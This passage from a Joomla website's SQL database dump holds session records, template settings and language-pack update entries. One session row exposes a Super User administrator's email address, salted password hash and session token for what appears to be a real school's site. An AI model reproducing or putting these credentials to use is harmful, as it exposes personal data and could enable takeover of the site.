('09f66cd1f82f42389c9bf281cfa56330', 0, 1, '1466685563', '__default|a:7:{s:22:"session.client.browser";s:110:"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36";s:15:"session.counter";i:28;s:8:"registry";O:9:"JRegistry":1:{s:7:"\0*\0data";O:8:"stdClass":0:{}}s:4:"user";O:5:"JUser":25:{s:9:"\0*\0isRoot";b:0;s:2:"id";i:0;s:4:"name";N;s:8:"username";N;s:5:"email";N;s:8:"password";N;s:14:"password_clear";s:0:"";s:8:"usertype";N;s:5:"block";N;s:9:"sendEmail";i:0;s:12:"registerDate";N;s:13:"lastvisitDate";N;s:10:"activation";N;s:6:"params";N;s:6:"groups";a:0:{}s:5:"guest";i:1;s:13:"lastResetTime";N;s:10:"resetCount";N;s:10:"\0*\0_params";O:9:"JRegistry":1:{s:7:"\0*\0data";O:8:"stdClass":0:{}}s:14:"\0*\0_authGroups";a:1:{i:0;i:1;}s:14:"\0*\0_authLevels";a:2:{i:0;i:1;i:1;i:1;}s:15:"\0*\0_authActions";N;s:12:"\0*\0_errorMsg";N;s:10:"\0*\0_errors";a:0:{}s:3:"aid";i:0;}s:19:"session.timer.start";i:1466678009;s:18:"session.timer.last";i:1466685557;s:17:"session.timer.now";i:1466685563;}', 0, '', ''),
('77iejf570alfgu4ta40bo3rm94', 1, 0, '1466684033', '__default|a:8:{s:15:"session.counter";i:22;s:19:"session.timer.start";i:1466678176;s:18:"session.timer.last";i:1466683347;s:17:"session.timer.now";i:1466684033;s:22:"session.client.browser";s:110:"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36";s:8:"registry";O:9:"JRegistry":1:{s:7:"\0*\0data";O:8:"stdClass":5:{s:11:"application";O:8:"stdClass":1:{s:4:"lang";s:0:"";}s:13:"com_installer";O:8:"stdClass":2:{s:7:"message";s:0:"";s:17:"extension_message";s:0:"";}s:14:"com_categories";O:8:"stdClass":1:{s:10:"categories";O:8:"stdClass":2:{s:6:"filter";O:8:"stdClass":1:{s:9:"extension";s:11:"com_content";}s:7:"content";O:8:"stdClass":5:{s:6:"search";s:0:"";s:6:"filter";O:8:"stdClass":4:{s:5:"level";i:0;s:6:"access";i:0;s:9:"published";s:0:"";s:8:"language";s:0:"";}s:10:"limitstart";s:1:"0";s:8:"ordercol";s:5:"a.lft";s:9:"orderdirn";s:3:"asc";}}}s:9:"com_menus";O:8:"stdClass":1:{s:5:"items";O:8:"stdClass":2:{s:6:"filter";O:8:"stdClass":1:{s:8:"menutype";s:8:"mainmenu";}s:10:"limitstart";i:0;}}s:6:"global";O:8:"stdClass":1:{s:4:"list";O:8:"stdClass":1:{s:5:"limit";i:20;}}}}s:4:"user";O:5:"JUser":25:{s:9:"\0*\0isRoot";b:1;s:2:"id";s:3:"390";s:4:"name";s:10:"Super User";s:8:"username";s:5:"admin";s:5:"email";s:29:"admin@lyceemaximiliensorre.fr";s:8:"password";s:65:"1f2e66daafece0da08c37d55be1b2e53:Bt0gaUur2rlWAUXTqD0SHtt85225UH0r";s:14:"password_clear";s:0:"";s:8:"usertype";s:10:"deprecated";s:5:"block";s:1:"0";s:9:"sendEmail";s:1:"1";s:12:"registerDate";s:19:"2012-07-08 16:26:39";s:13:"lastvisitDate";s:19:"2016-06-23 10:36:15";s:10:"activation";s:1:"0";s:6:"params";s:92:"{"admin_style":"","admin_language":"","language":"","editor":"","helpsite":"","timezone":""}";s:6:"groups";a:1:{i:8;s:1:"8";}s:5:"guest";i:0;s:13:"lastResetTime";s:19:"0000-00-00 00:00:00";s:10:"resetCount";s:1:"0";s:10:"\0*\0_params";O:9:"JRegistry":1:{s:7:"\0*\0data";O:8:"stdClass":6:{s:11:"admin_style";s:0:"";s:14:"admin_language";s:0:"";s:8:"language";s:0:"";s:6:"editor";s:0:"";s:8:"helpsite";s:0:"";s:8:"timezone";s:0:"";}}s:14:"\0*\0_authGroups";a:2:{i:0;i:1;i:1;i:8;}s:14:"\0*\0_authLevels";a:4:{i:0;i:1;i:1;i:1;i:2;i:2;i:3;i:3;}s:15:"\0*\0_authActions";N;s:12:"\0*\0_errorMsg";N;s:10:"\0*\0_errors";a:0:{}s:3:"aid";i:0;}s:13:"session.token";s:32:"6e998bb5add4690086279c4ed91917ae";}', 390, 'admin', '');

-- --------------------------------------------------------

--
-- Table structure for table `jos_template_styles`
--

CREATE TABLE IF NOT EXISTS `jos_template_styles` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `template` varchar(50) NOT NULL DEFAULT '',
  `client_id` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `home` char(7) NOT NULL DEFAULT '0',
  `title` varchar(255) NOT NULL DEFAULT '',
  `params` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `idx_template` (`template`),
  KEY `idx_home` (`home`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=8 ;

--
-- Dumping data for table `jos_template_styles`
--

INSERT INTO `jos_template_styles` (`id`, `template`, `client_id`, `home`, `title`, `params`) VALUES
(2, 'bluestork', 1, '1', 'Bluestork - Default', '{"useRoundedCorners":"1","showSiteName":"0"}'),
(3, 'atomic', 0, '0', 'Atomic - Default', '{}'),
(4, 'beez_20', 0, '0', 'Beez2 - Default', '{"wrapperSmall":"53","wrapperLarge":"72","logo":"images\\/joomla_black.gif","sitetitle":"Joomla!","sitedescription":"Open Source Content Management","navposition":"left","templatecolor":"personal","html5":"0"}'),
(5, 'hathor', 1, '0', 'Hathor - Default', '{"showSiteName":"0","colourChoice":"","boldText":"0"}'),
(6, 'beez5', 0, '0', 'Beez5 - Default-Fruit Shop', '{"wrapperSmall":"53","wrapperLarge":"72","logo":"images\\/sampledata\\/fruitshop\\/fruits.gif","sitetitle":"Matuna Market ","sitedescription":"Fruit Shop Sample Site","navposition":"left","html5":"0"}'),
(7, 'theme777', 0, '1', 'theme777 - Default', '{"logo":"files\\/images\\/logo.png","sitetitle":"","sitedescription":"","leftcol":"310","rightcol":"310"}');

-- --------------------------------------------------------

--
-- Table structure for table `jos_updates`
--

CREATE TABLE IF NOT EXISTS `jos_updates` (
  `update_id` int(11) NOT NULL AUTO_INCREMENT,
  `update_site_id` int(11) DEFAULT '0',
  `extension_id` int(11) DEFAULT '0',
  `categoryid` int(11) DEFAULT '0',
  `name` varchar(100) DEFAULT '',
  `description` text NOT NULL,
  `element` varchar(100) DEFAULT '',
  `type` varchar(20) DEFAULT '',
  `folder` varchar(20) DEFAULT '',
  `client_id` tinyint(3) DEFAULT '0',
  `version` varchar(10) DEFAULT '',
  `data` text NOT NULL,
  `detailsurl` text NOT NULL,
  `infourl` text NOT NULL,
  PRIMARY KEY (`update_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='Available Updates' AUTO_INCREMENT=1332 ;

--
-- Dumping data for table `jos_updates`
--

INSERT INTO `jos_updates` (`update_id`, `update_site_id`, `extension_id`, `categoryid`, `name`, `description`, `element`, `type`, `folder`, `client_id`, `version`, `data`, `detailsurl`, `infourl`) VALUES
(1, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.8.1', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(2, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.8.1', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(3, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.13.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(4, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.13.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(5, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(6, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(7, 3, 0, 0, 'Khmer', '', 'pkg_km-KH', 'package', '', 0, '2.5.7.1', '', 'http://update.joomla.org/language/details/km-KH_details.xml', ''),
(8, 3, 0, 0, 'Khmer', '', 'pkg_km-KH', 'package', '', 0, '2.5.7.1', '', 'http://update.joomla.org/language/details/km-KH_details.xml', ''),
(9, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.10.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(10, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.10.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(11, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.8.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(12, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.8.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(13, 3, 0, 0, 'Bulgarian', '', 'pkg_bg-BG', 'package', '', 0, '2.5.7.1', '', 'http://update.joomla.org/language/details/bg-BG_details.xml', ''),
(14, 3, 0, 0, 'Bulgarian', '', 'pkg_bg-BG', 'package', '', 0, '2.5.7.1', '', 'http://update.joomla.org/language/details/bg-BG_details.xml', ''),
(17, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(18, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(19, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(20, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(21, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(22, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(23, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.13.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(24, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.13.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(25, 3, 0, 0, 'Ukrainian', '', 'pkg_uk-UA', 'package', '', 0, '2.5.13.11', '', 'http://update.joomla.org/language/details/uk-UA_details.xml', ''),
(26, 3, 0, 0, 'Ukrainian', '', 'pkg_uk-UA', 'package', '', 0, '2.5.13.11', '', 'http://update.joomla.org/language/details/uk-UA_details.xml', ''),
(27, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.14.2', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(28, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.14.2', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(29, 3, 0, 0, 'Belarusian', '', 'pkg_be-BY', 'package', '', 0, '2.5.8.1', '', 'http://update.joomla.org/language/details/be-BY_details.xml', ''),
(30, 3, 0, 0, 'Belarusian', '', 'pkg_be-BY', 'package', '', 0, '2.5.8.1', '', 'http://update.joomla.org/language/details/be-BY_details.xml', ''),
(31, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.13.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(32, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.13.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(33, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.7.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(34, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.7.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(35, 3, 0, 0, 'Romanian', '', 'pkg_ro-RO', 'package', '', 0, '2.5.11.1', '', 'http://update.joomla.org/language/details/ro-RO_details.xml', ''),
(36, 3, 0, 0, 'Romanian', '', 'pkg_ro-RO', 'package', '', 0, '2.5.11.1', '', 'http://update.joomla.org/language/details/ro-RO_details.xml', ''),
(37, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(38, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(39, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.13.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(40, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.13.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(41, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(42, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(43, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.13.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(44, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.13.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(45, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.13.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(46, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.13.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(47, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(48, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(49, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.11.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(50, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.10.1', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(51, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.10.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(52, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.13.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(53, 3, 0, 0, 'Lithuanian', '', 'pkg_lt-LT', 'package', '', 0, '2.5.7.1', '', 'http://update.joomla.org/language/details/lt-LT_details.xml', ''),
(54, 3, 0, 0, 'Albanian', '', 'pkg_sq-AL', 'package', '', 0, '2.5.1.5', '', 'http://update.joomla.org/language/details/sq-AL_details.xml', ''),
(55, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.13.1', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(56, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.13.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(57, 3, 0, 0, 'Galician', '', 'pkg_gl-ES', 'package', '', 0, '2.5.7.4', '', 'http://update.joomla.org/language/details/gl-ES_details.xml', ''),
(58, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(59, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.10.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(60, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.8.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(61, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.13.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(62, 3, 0, 0, 'Hebrew', '', 'pkg_he-IL', 'package', '', 0, '2.5.7.1', '', 'http://update.joomla.org/language/details/he-IL_details.xml', ''),
(63, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.13.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(64, 3, 0, 0, 'Laotian', '', 'pkg_lo-LA', 'package', '', 0, '2.5.6.1', '', 'http://update.joomla.org/language/details/lo-LA_details.xml', ''),
(65, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(66, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(67, 3, 0, 0, 'Greek', '', 'pkg_el-GR', 'package', '', 0, '2.5.6.1', '', 'http://update.joomla.org/language/details/el-GR_details.xml', ''),
(68, 3, 0, 0, 'Esperanto', '', 'pkg_eo-XX', 'package', '', 0, '2.5.6.1', '', 'http://update.joomla.org/language/details/eo-XX_details.xml', ''),
(69, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.13.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(70, 3, 0, 0, 'Portuguese Brazil', '', 'pkg_pt-BR', 'package', '', 0, '2.5.9.1', '', 'http://update.joomla.org/language/details/pt-BR_details.xml', ''),
(71, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.13.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(72, 3, 0, 0, 'Vietnamese', '', 'pkg_vi-VN', 'package', '', 0, '2.5.8.1', '', 'http://update.joomla.org/language/details/vi-VN_details.xml', ''),
(73, 3, 0, 0, 'Kurdish Sorani', '', 'pkg_ckb-IQ', 'package', '', 0, '2.5.9.1', '', 'http://update.joomla.org/language/details/ckb-IQ_details.xml', ''),
(74, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.11.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(75, 3, 0, 0, 'Croatian', '', 'pkg_hr-HR', 'package', '', 0, '2.5.13.1', '', 'http://update.joomla.org/language/details/hr-HR_details.xml', ''),
(76, 3, 0, 0, 'Azeri', '', 'pkg_az-AZ', 'package', '', 0, '2.5.7.1', '', 'http://update.joomla.org/language/details/az-AZ_details.xml', ''),
(77, 3, 0, 0, 'Norwegian Nynorsk', '', 'pkg_nn-NO', 'package', '', 0, '2.5.8.1', '', 'http://update.joomla.org/language/details/nn-NO_details.xml', ''),
(78, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.14.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(79, 3, 0, 0, 'Scottish Gaelic', '', 'pkg_gd-GB', 'package', '', 0, '2.5.7.1', '', 'http://update.joomla.org/language/details/gd-GB_details.xml', ''),
(80, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.13.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(81, 3, 0, 0, 'Basque', '', 'pkg_eu-ES', 'package', '', 0, '1.7.0.1', '', 'http://update.joomla.org/language/details/eu-ES_details.xml', ''),
(82, 3, 0, 0, 'Uyghur', '', 'pkg_ug-CN', 'package', '', 0, '2.5.7.2', '', 'http://update.joomla.org/language/details/ug-CN_details.xml', ''),
(83, 3, 0, 0, 'Korean', '', 'pkg_ko-KR', 'package', '', 0, '2.5.11.1', '', 'http://update.joomla.org/language/details/ko-KR_details.xml', ''),
(84, 3, 0, 0, 'Hindi', '', 'pkg_hi-IN', 'package', '', 0, '2.5.6.1', '', 'http://update.joomla.org/language/details/hi-IN_details.xml', ''),
(85, 3, 0, 0, 'Welsh', '', 'pkg_cy-GB', 'package', '', 0, '2.5.6.1', '', 'http://update.joomla.org/language/details/cy-GB_details.xml', ''),
(86, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(137, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(136, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.17.2', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(108, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.17', '', 'http://update.joomla.org/core/extension.xml', ''),
(90, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(91, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.14.3', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(92, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.16', '', 'http://update.joomla.org/core/extension.xml', ''),
(93, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(135, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(95, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.15.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(96, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.15.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(97, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(98, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(99, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(100, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(101, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(102, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(103, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(104, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.16.2', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(105, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(106, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(107, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(109, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(110, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(111, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.17.2', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(112, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(113, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(114, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(115, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(116, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2-5-17.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(117, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(118, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.17.2', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(119, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(120, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(121, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(122, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(123, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(124, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(125, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(126, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(127, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(128, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(129, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(130, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(131, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(132, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.17.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(133, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(134, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(138, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(139, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(140, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.17.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(141, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2-5-17.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
